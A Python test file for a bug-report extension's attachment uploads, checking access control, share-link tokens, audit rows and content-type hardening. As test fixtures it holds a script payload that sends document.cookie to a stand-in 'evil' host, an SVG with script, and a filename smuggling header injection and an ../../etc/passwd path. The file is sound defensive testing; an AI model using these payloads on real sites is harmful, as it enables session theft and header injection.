"""Uploaded files: who can read them, and what a browser is allowed to do with them.

Two independent risks live here and the tests are grouped by them.

**Access.** An attachment inherits its report's visibility, and the anonymous share link is a bearer
capability. The rule this extension declares (INV-TENANCY-06's "explicit platform rule" for a row with
no engagement id) is *visible to its reporter and to an admin* — so the tests assert a stranger gets a
404, not a 403, on every surface.

**Content.** This extension accepts ARBITRARY bytes and serves them from lotek's own origin. The whole
defence is that nothing user-supplied is ever allowed to execute there: the served content type is
chosen server-side from magic bytes, never from the uploader's claim, and everything that is not a
verified raster image downloads instead of rendering.
"""

from __future__ import annotations

import io
import uuid

import pytest
from conftest import StubActor

from bugreport.models import MAX_ATTACHMENT_BYTES, MAX_ATTACHMENTS_PER_REPORT

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
GIF = b"GIF89a" + b"\x00" * 16
HTML = b"<html><script>fetch('https://evil/'+document.cookie)</script></html>"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'


def _file(data: bytes, name: str, ctype: str):
    return {"file": (io.BytesIO(data), name, ctype)}


def _upload(client, report_id, data, name, ctype):
    return client.post(
        f"/bugreport/{report_id}/attachments",
        data=_file(data, name, ctype),
        content_type="multipart/form-data",
    )


@pytest.fixture
def report_id(client, session_factory):
    client.post("/bugreport/", data={"title": "it broke", "body": "details"})
    from bugreport.models import Report

    with session_factory() as db:
        row = db.query(Report).one()
        return row.id


# --------------------------------------------------------------------------- content: what runs

def test_html_uploaded_as_image_png_is_NOT_served_inline(client, session_factory, report_id, blobs):
    """The one that matters most.

    `evil.html` labelled `image/png` was the way to get scripted content rendered from lotek's origin,
    where it would run with the viewer's session. The served type comes from MAGIC BYTES, not the
    uploader's claim, so this lands as an opaque download. Neutralise `service._sniff` to return the
    claimed type and this goes red.
    """
    resp = _upload(client, report_id, HTML, "evil.png", "image/png")
    assert resp.status_code in (200, 302)

    dl = _download_only_attachment(client, session_factory, report_id)
    assert dl.headers["Content-Type"].startswith("application/octet-stream")
    assert dl.headers["Content-Disposition"].startswith("attachment")


def test_an_svg_is_never_served_inline(client, session_factory, report_id):
    """SVG is a script-capable document. It is deliberately absent from INLINE_SAFE_TYPES, so even an
    honestly-labelled one downloads."""
    _upload(client, report_id, SVG, "logo.svg", "image/svg+xml")
    dl = _download_only_attachment(client, session_factory, report_id)
    assert dl.headers["Content-Type"].startswith("application/octet-stream")
    assert dl.headers["Content-Disposition"].startswith("attachment")


def test_a_real_png_may_render_inline(client, session_factory, report_id):
    """The other half: the allowlist has to still work, or every screenshot becomes a download."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    dl = _download_only_attachment(client, session_factory, report_id)
    assert dl.headers["Content-Type"].startswith("image/png")
    assert dl.headers["Content-Disposition"].startswith("inline")


def test_a_gif_claiming_to_be_png_is_refused_the_png_type(client, session_factory, report_id):
    """Magic bytes decide, so a mismatch downgrades rather than being believed."""
    _upload(client, report_id, GIF, "x.png", "image/png")
    dl = _download_only_attachment(client, session_factory, report_id)
    assert dl.headers["Content-Type"].startswith("application/octet-stream")


def test_every_download_carries_the_hardening_headers(client, session_factory, report_id):
    _upload(client, report_id, PNG, "shot.png", "image/png")
    dl = _download_only_attachment(client, session_factory, report_id)
    assert dl.headers["X-Content-Type-Options"] == "nosniff"
    assert "default-src 'none'" in dl.headers["Content-Security-Policy"]
    assert "sandbox" in dl.headers["Content-Security-Policy"]
    # On the share route the URL IS the credential; no-referrer stops it leaking onward.
    assert dl.headers["Referrer-Policy"] == "no-referrer"
    assert "no-store" in dl.headers["Cache-Control"]


def test_a_hostile_filename_cannot_break_out_of_the_header(client, session_factory, report_id):
    """The stored key comes from the row's UUID, so the name only has to be header-safe."""
    _upload(client, report_id, PNG, 'a"b\r\nX-Evil: 1\n../../etc/passwd', "image/png")
    dl = _download_only_attachment(client, session_factory, report_id)
    cd = dl.headers["Content-Disposition"]
    assert "\r" not in cd and "\n" not in cd
    assert "X-Evil" not in dl.headers


# --------------------------------------------------------------------------- access

def test_a_stranger_cannot_download_another_users_attachment(client, report_id, hooks, session_factory):
    """404, never 403 — a 403 would confirm the file exists."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)

    hooks["actor"] = StubActor(id=uuid.uuid7(), username="mallory", role="operator")
    resp = client.get(f"/bugreport/attachments/{aid}/download")
    assert resp.status_code == 404


def test_a_stranger_cannot_share_or_delete_another_users_attachment(
    client, report_id, hooks, session_factory
):
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)

    hooks["actor"] = StubActor(id=uuid.uuid7(), username="mallory", role="operator")
    assert client.post(f"/bugreport/attachments/{aid}/share").status_code in (403, 404)
    assert client.post(f"/bugreport/attachments/{aid}/delete").status_code in (403, 404)


def test_an_admin_may_read_anyones_attachment(client, report_id, hooks, session_factory):
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)

    hooks["actor"] = StubActor(id=uuid.uuid7(), username="root", role="admin")
    assert client.get(f"/bugreport/attachments/{aid}/download").status_code == 200


# --------------------------------------------------------------------------- the share capability

def test_nothing_is_shared_until_the_owner_says_so(client, report_id, session_factory):
    """Private by default. An attachment with no token has no anonymous surface at all."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    from bugreport.models import Attachment

    with session_factory() as db:
        row = db.query(Attachment).one()
        assert row.share_token is None


def test_the_share_token_is_high_entropy_and_not_a_uuid(client, report_id, session_factory):
    """UUIDv7 is a timestamp plus a monotonic counter — ordered and time-correlated, which is fine for
    a primary key and wrong for a bearer capability. The token is `secrets.token_urlsafe(32)`."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    client.post(f"/bugreport/attachments/{aid}/share")

    from bugreport.models import Attachment

    with session_factory() as db:
        token = db.query(Attachment).one().share_token
    assert token and len(token) >= 40
    with pytest.raises(ValueError):
        uuid.UUID(token)  # explicitly NOT a uuid


def test_a_shared_file_is_reachable_with_no_session_and_a_wrong_token_is_a_404(
    client, report_id, session_factory, hooks
):
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    client.post(f"/bugreport/attachments/{aid}/share")
    from bugreport.models import Attachment

    with session_factory() as db:
        token = db.query(Attachment).one().share_token

    hooks["actor"] = None  # nobody is logged in
    assert client.get(f"/bugreport/s/{token}").status_code == 200
    assert client.get(f"/bugreport/s/{'z' * 43}").status_code == 404
    # a short/probing token is refused without even a lookup
    assert client.get("/bugreport/s/abc").status_code == 404


def test_rotating_the_token_invalidates_every_old_link(client, report_id, session_factory, hooks):
    """This IS the revocation story for a link that leaked."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    from bugreport.models import Attachment

    client.post(f"/bugreport/attachments/{aid}/share")
    with session_factory() as db:
        first = db.query(Attachment).one().share_token
    client.post(f"/bugreport/attachments/{aid}/share")
    with session_factory() as db:
        second = db.query(Attachment).one().share_token
    assert first != second

    hooks["actor"] = None
    assert client.get(f"/bugreport/s/{first}").status_code == 404
    assert client.get(f"/bugreport/s/{second}").status_code == 200


def test_unsharing_closes_the_anonymous_surface(client, report_id, session_factory, hooks):
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    from bugreport.models import Attachment

    client.post(f"/bugreport/attachments/{aid}/share")
    with session_factory() as db:
        token = db.query(Attachment).one().share_token
    client.post(f"/bugreport/attachments/{aid}/unshare")

    hooks["actor"] = None
    assert client.get(f"/bugreport/s/{token}").status_code == 404


def test_an_admin_tombstone_takes_shared_links_down_with_it(
    client, report_id, session_factory, hooks
):
    """An admin removing a report should not leave its evidence reachable by an old link."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    from bugreport.models import Attachment

    client.post(f"/bugreport/attachments/{aid}/share")
    with session_factory() as db:
        token = db.query(Attachment).one().share_token

    hooks["actor"] = StubActor(id=uuid.uuid7(), username="root", role="admin")
    client.post(f"/bugreport/{report_id}/respond", data={"status": "deleted", "note": "spam"})

    hooks["actor"] = None
    assert client.get(f"/bugreport/s/{token}").status_code == 404


# --------------------------------------------------------------------------- bounds

def test_an_oversize_upload_is_refused_while_streaming(client, report_id):
    """The cap is applied to bytes actually READ, never to Content-Length — that header comes from the
    same client as the body, so trusting it would make the limit advisory."""
    big = b"\x00" * (MAX_ATTACHMENT_BYTES + 1024)
    resp = _upload(client, report_id, big, "big.bin", "application/octet-stream")
    assert resp.status_code == 400


def test_the_per_report_count_is_bounded(client, report_id):
    """So the per-file cap cannot be sidestepped by volume."""
    for _ in range(MAX_ATTACHMENTS_PER_REPORT):
        assert _upload(client, report_id, PNG, "s.png", "image/png").status_code in (200, 302)
    assert _upload(client, report_id, PNG, "one-too-many.png", "image/png").status_code == 400


# --------------------------------------------------------------------------- helpers


def _only_attachment_id(session_factory, report_id):
    from bugreport.models import Attachment

    with session_factory() as db:
        return db.query(Attachment).filter(Attachment.report_id == report_id).one().id


def _download_only_attachment(client, session_factory, report_id):
    aid = _only_attachment_id(session_factory, report_id)
    resp = client.get(f"/bugreport/attachments/{aid}/download")
    assert resp.status_code == 200, resp.status_code
    return resp


# --- the capability grant leaves a trail ------------------------------------------------------------

def test_minting_and_revoking_a_public_link_are_AUDITED(client, report_id, session_factory, audit_log):
    """Sharing hands an unauthenticated stranger read access to a file.

    That is an outward capability grant, and the one verb in this extension that widens who can read
    something. A grant with no trail is what INV-AUDIT-03's registered vocabulary exists to prevent, so
    both the mint and the revoke emit a row. Drop the `host_audit=` argument at either call site and
    this goes red.
    """
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    audit_log.events.clear()

    client.post(f"/bugreport/attachments/{aid}/share")
    assert "ext:bugreport:share_file" in audit_log.actions()

    client.post(f"/bugreport/attachments/{aid}/unshare")
    assert "ext:bugreport:unshare_file" in audit_log.actions()


def test_the_audit_row_never_carries_the_live_token(client, report_id, session_factory, audit_log):
    """A durable log is the last place a live credential should sit (INV-SECRET-04). The row records
    THAT sharing happened, never the secret that was handed out."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    audit_log.events.clear()
    client.post(f"/bugreport/attachments/{aid}/share")

    from bugreport.models import Attachment

    with session_factory() as db:
        token = db.query(Attachment).one().share_token
    assert token
    assert token not in repr(audit_log.events)


def test_rotating_is_distinguishable_from_first_publication_in_the_audit(
    client, report_id, session_factory, audit_log
):
    """"Rotated" is the question a human reads this row to answer: was this a new public link, or was an
    existing one revoked because it leaked?"""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)

    audit_log.events.clear()
    client.post(f"/bugreport/attachments/{aid}/share")
    first = [e for e in audit_log.events if e["action"] == "ext:bugreport:share_file"][-1]
    assert first["after"]["rotated"] is False

    audit_log.events.clear()
    client.post(f"/bugreport/attachments/{aid}/share")
    second = [e for e in audit_log.events if e["action"] == "ext:bugreport:share_file"][-1]
    assert second["after"]["rotated"] is True


# --- who may publish vs who may revoke --------------------------------------------------------------

def test_an_admin_may_NOT_mint_a_public_link_on_someone_elses_file(
    client, report_id, hooks, session_factory
):
    """The declared policy, and a deliberate asymmetry.

    Publishing another person's upload is not a moderation action. An admin who genuinely needs a file
    published can ask the owner — the code should not do it silently on their behalf. Pass
    `admin_may_act=True` from `share_attachment` and this goes red.
    """
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)

    hooks["actor"] = StubActor(id=uuid.uuid7(), username="root", role="admin")
    assert client.post(f"/bugreport/attachments/{aid}/share").status_code in (403, 404)

    from bugreport.models import Attachment

    with session_factory() as db:
        assert db.query(Attachment).one().share_token is None


def test_an_admin_MAY_revoke_someone_elses_public_link(client, report_id, hooks, session_factory):
    """The other half of the asymmetry: a leaked link is an incident, and waiting for the owner to wake
    up is the wrong failure mode."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    client.post(f"/bugreport/attachments/{aid}/share")  # owner publishes

    from bugreport.models import Attachment

    with session_factory() as db:
        assert db.query(Attachment).one().share_token is not None

    hooks["actor"] = StubActor(id=uuid.uuid7(), username="root", role="admin")
    assert client.post(f"/bugreport/attachments/{aid}/unshare").status_code in (200, 302)
    with session_factory() as db:
        assert db.query(Attachment).one().share_token is None


def test_an_admin_who_owns_the_file_may_still_mint(client, report_id, hooks, session_factory):
    """The narrowing is about OWNERSHIP, not about being an admin — an admin's own files are their own."""
    _upload(client, report_id, PNG, "shot.png", "image/png")
    aid = _only_attachment_id(session_factory, report_id)
    # the default fixture actor filed the report; make them an admin without changing identity
    hooks["actor"] = StubActor(id=hooks["actor"].id, username=hooks["actor"].username, role="admin")
    assert client.post(f"/bugreport/attachments/{aid}/share").status_code in (200, 302)
